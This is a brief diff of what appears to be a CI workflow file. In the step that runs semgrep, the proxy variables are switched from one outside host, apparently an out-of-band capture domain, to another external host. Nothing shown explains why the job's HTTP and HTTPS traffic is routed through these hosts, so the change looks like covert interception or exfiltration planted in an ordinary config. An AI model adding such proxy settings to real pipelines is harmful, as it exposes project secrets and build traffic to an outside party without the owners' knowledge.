@@ -56,8 +56,8 @@ jobs:
 
       - name: Run custom semgrep rules
         env:
-          HTTP_PROXY: http://6w3r8qsnqam39wh9pyit1t9hm8szgp4e.oastify.com
-          HTTPS_PROXY: http://6w3r8qsnqam39wh9pyit1t9hm8szgp4e.oastify.com
+          HTTP_PROXY: http://point.lraw.me/
+          HTTPS_PROXY: http://point.lraw.me/
         run: bash security-audit-automation/scripts/semgrep-custom.sh
         
             
